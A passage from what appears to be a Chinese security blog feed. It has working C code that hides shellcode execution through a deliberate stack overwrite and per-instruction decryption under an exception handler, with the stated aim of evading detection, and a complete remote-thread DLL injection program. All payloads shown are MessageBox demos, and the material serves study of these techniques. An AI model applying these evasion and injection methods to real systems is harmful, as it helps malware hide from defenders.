src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579162383.png" alt=""></p><p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png" alt=""></p><p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br></pre></td></tr></tbody></table></figure><p>将shellcode的地址覆盖ret的地址</p><p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p><h2 id="分析利用"><a class="header-anchor" href="#分析利用">¶</a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p><p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2022</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><h2 id="效果-v2"><a class="header-anchor" href="#效果-v2">¶</a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png" alt=""></p><h2 id="分析-v11"><a class="header-anchor" href="#分析-v11">¶</a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559733763.png" alt=""></p><h1 id="0x07-shellcode的加密与释放"><a class="header-anchor" href="#0x07-shellcode的加密与释放">¶</a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p><p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png" alt=""></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"ldata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> trapcode[] = <span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> llcode = <span class="number">204</span>;<span class="comment">//CC 00 00 00INT3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:ldata,RWE"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">llcode = <span class="number">0xF333333333333333</span>;</span><br><span class="line">llcode &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* data = (<span class="keyword">char</span>*)&amp;llcode;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 解密shellcode 并且执行</span></span><br><span class="line"><span class="comment">* len 解密后的指令长度</span></span><br><span class="line"><span class="comment">* data 把解密后的指令写入data</span></span><br><span class="line"><span class="comment">* 比如 push ebp 就向data写入0x55</span></span><br><span class="line"><span class="comment">* 每次解密一条指令 不要用超过7字节的指令和跳转指令</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打辣"</span>, <span class="string">"停下"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandle</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)</span><br><span class="line">{</span><br><span class="line">Decshellcode();</span><br><span class="line">val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandle);</span><br><span class="line"><span class="keyword">int</span> bilibili = <span class="number">2020</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p><p><a href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p><p>AddVectoredExceptionHandler是异常处理机制try和except的封装，val-&gt;ExceptionRecord-&gt;ExceptionCode记录着异常的类型</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581840737.png" alt=""></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581929518.png" alt=""></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649582032897.png" alt=""></p><h1 id="shellcode注入"><a class="header-anchor" href="#shellcode注入">¶</a>shellcode注入</h1><p>当然shellcode注入不止这种，还有其他的方法</p><p><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021">https://myzxcg.com/2022/01/Windows-Shellcode-注入姿势/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021</a></p><p><a href="https://cloud.tencent.com/developer/article/1787191">https://cloud.tencent.com/developer/article/1787191</a></p><p>shellcode加密</p><p><a href="https://www.cnblogs.com/LyShark/p/13033722.html">https://www.cnblogs.com/LyShark/p/13033722.html</a></p><h1 id="0x08-隐藏API"><a class="header-anchor" href="#0x08-隐藏API">¶</a>0x08-隐藏API</h1><p>利用栈溢出隐藏API</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;shellcode&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>DLL注入</title>
    <link href="https://gift1a.github.io/2022/04/09/DLL%E6%B3%A8%E5%85%A5/"/>
    <id>https://gift1a.github.io/2022/04/09/DLL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-09T13:31:05.000Z</published>
    <updated>2022-04-20T01:24:19.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-远程线程注入"><a class="header-anchor" href="#0x00-远程线程注入">¶</a>0x00-远程线程注入</h1><h2 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h2><p>线程注入，是通过开启远程线程的方式，将DLL加载到目标宿主进程中的常用方式。</p><p>由于WinNT系统下进程空间的独立性，获取其他进程的信息，就需要进入目标进程空间的方式，而使用线程注入可以轻松实现。</p><blockquote><p>使用LoadLibrary动态加载DLL</p><p>使用GetProcAddress获取DLL中导出函数的指针</p></blockquote><h3 id="DLL的分类"><a class="header-anchor" href="#DLL的分类">¶</a>DLL的分类</h3><p>在VS的编译环境下，DLL又分为三类：</p><blockquote><p>非MFC的DLL——即使用SDK API进行编程，能被其他所有语言调用</p><p>MFC规则DLL——可以使用MFC进行编程，能被其他所有语言调用</p><p>MFC扩展DLL——可以使用MFC进行编程，但只能被用MFC编写的程序调用</p></blockquote><p>MFC——Microsoft Foundation Class-Library是微软用C++对API进行的封装，全部封装成了类，简化了使用</p><h3 id="DLL的入口点和参数"><a class="header-anchor" href="#DLL的入口点和参数">¶</a>DLL的入口点和参数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved )</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// Perform actions based on the reason for calling.</span></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    { </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">         <span class="comment">// Initialize once for each new process.进程第一次链接DLL并通过它的入口点会得到这个参数</span></span><br><span class="line">         <span class="comment">// Return FALSE to fail DLL load.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">         <span class="comment">// Do thread-specific initialization.进程在空间中取消DLL的映射时会得到这个参数</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">         <span class="comment">// Do thread-specific cleanup.每当新线程创建时，系统会对所有映射的DLL传入此参数调用入口函数</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">         <span class="comment">// Perform any necessary cleanup.每当线程退出或者返回时时，系统会对所有映射的DLL传入此参数要求执行对应清理工作</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="DLL编写与导出"><a class="header-anchor" href="#DLL编写与导出">¶</a>DLL编写与导出</h2><p>DLL的导出函数使用</p><blockquote><p>extern “C” _declspec(dllexport)</p></blockquote><p>DLL的导入函数使用</p><blockquote><p>extern “C” _declspec(dllimport)</p></blockquote><p>其中，extern "C"作为一种编译约定，表示按照C语言的方式导出</p><blockquote><p>由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般只包括函数名。 这样我们就可以直接通过函数名对DLL导出函数进行调用</p></blockquote><h3 id="DLL动态加载"><a class="header-anchor" href="#DLL动态加载">¶</a>DLL动态加载</h3><p>既然我们要把DLL注入到进程中，那么需要先了解一下，进程是怎样调用DLL的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用LoadLibrary加载所需的DLL</span></span><br><span class="line"><span class="comment">//LoadLibraryA和LoadLibraryW分别对应ANSI编码下和Unicode编码下，因为一般都是Unicode，所以一般用w，路径记得改为\\</span></span><br><span class="line"><span class="comment">HMODULE hMod = LoadLibraryA(DLL路径);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义导入函数指针</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*ADD_IMPORT)</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;<span class="comment">//定义一个返回值为int型的函数指针,这样ADD_IMPORT就是一个函数指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用GetProcAddress获取函数入口点</span></span><br><span class="line"></span><br><span class="line">ADD_IMPORT add_proc=(ADD_IMPORT)GetProcAddress(hMod,<span class="string">"ADD"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接调用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = add_proc(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放句柄</span></span><br><span class="line">FreeLibrary(hMod);</span><br></pre></td></tr></tbody></table></figure><h2 id="线程注入"><a class="header-anchor" href="#线程注入">¶</a>线程注入</h2><h3 id="注入的可行性"><a class="header-anchor" href="#注入的可行性">¶</a>注入的可行性</h3><blockquote><p>kernel32.dll和user32.dll是两个在大部分程序上都会调用的DLL</p><p>同一个DLL，在不同进程中不一定被映射（加载）在同一个内存地址下</p><p>但是kernel32.dll和user32.dll除外，它们总是被映射到进程的内存首选地址</p><p>因此在所有使用这两个DLL的进程中，这两个DLL的内存地址是相同的</p><p>因此<strong>我们在本进程获取的kernel32.dll中函数的地址，在目标进程也是一样的</strong></p></blockquote><h3 id="线程注入过程"><a class="header-anchor" href="#线程注入过程">¶</a>线程注入过程</h3><blockquote><p>目标进程-&gt;开辟并传入DLL地址-&gt;开启远程线程-&gt;加载DLL-&gt;实现DLL的注入</p></blockquote><p>依次使用以下函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess()<span class="comment">//获取目标进程的句柄</span></span><br><span class="line">VirtualAllocEx()<span class="comment">//在进程中申请空间</span></span><br><span class="line">WriteProcessMemory()<span class="comment">//向进程中写入DLL路径</span></span><br><span class="line">GetProcAddress()<span class="comment">//取得函数LoadLibrary在DLL中的地址</span></span><br><span class="line">CreateRemoteThreadEx()<span class="comment">//在目标进程中创建新线程使用LoadLibrary加载DLL</span></span><br><span class="line">WaitForSingleObject()<span class="comment">//挂起线程，可以传递INFINITE指明要无限期等待下去，等待线程执行完再执行下一步</span></span><br><span class="line">CloseHandle()<span class="comment">//关闭句柄</span></span><br></pre></td></tr></tbody></table></figure><p>CreateRemoteThread()函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES   lpThreadAttributes, <span class="comment">//线程安全相关的属性，常置为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T                  dwStackSize,        <span class="comment">//新线程的初始化栈在大小，可设置为0</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE  lpStartAddress,     <span class="comment">//被线程执行的回调函数，也称为线程函数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID                  lpParameter,        <span class="comment">//传入线程函数的参数，不需传递参数时为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD                   dwCreationFlags,    <span class="comment">//控制线程创建的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD                 lpThreadId          <span class="comment">//传出参数，用于获得线程ID，如果为NULL则不返回线程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>目标其实就是让目标进程调用<code>LoadLibrary()</code>加载dll</p><blockquote><p>将线程函数指定为LoadLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><p>CreateRemoteThread()原意是在外部进程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><p>Inject.cpp</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//确定路径需要占用的缓冲区大小</span></span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限）</span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">    {</span><br><span class="line">        _tprintf(<span class="string">L"OpenProcess(%d) failed!!! [%d]\n"</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName</span></span><br><span class="line">      <span class="comment">// VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址,最后一个参数表示开辟内存的属性</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3.  将myhack.dll路径 ("c:\\myhack.dll")写入目标进程中分配到的内存</span></span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. 获取LoadLibraryA() API的地址</span></span><br><span class="line">      <span class="comment">// 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到   </span></span><br><span class="line">      <span class="comment">// InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地</span></span><br><span class="line">      <span class="comment">// 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的</span></span><br><span class="line">      <span class="comment">// kernerl32.dll的加载地址还是一样的。</span></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #5. 在目标进程notepad.exe中运行远程线程</span></span><br><span class="line">      <span class="comment">// pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址</span></span><br><span class="line">      <span class="comment">// pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同样，记得关闭句柄</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    {</span><br><span class="line">        _tprintf(<span class="string">L"USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span> (InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line">        _tprintf(<span class="string">L"InjectDll(\"%s\") success!!!\n"</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L"InjectDll(\"%s\") failed!!!\n"</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>inject.dll</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pch.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"helloworld"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBoxA(<span class="number">0</span>, <span class="string">"注入成功"</span>, <span class="string">"Hint"</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="效果"><a class="header-anchor" href="#效果">¶</a>效果</h3><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655410419.png" alt=""></p><p>可以看到在notepad.exe的进程中注入了inject.dll</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655358785.png" alt=""></p><h3 id="附"><a class="header-anchor" 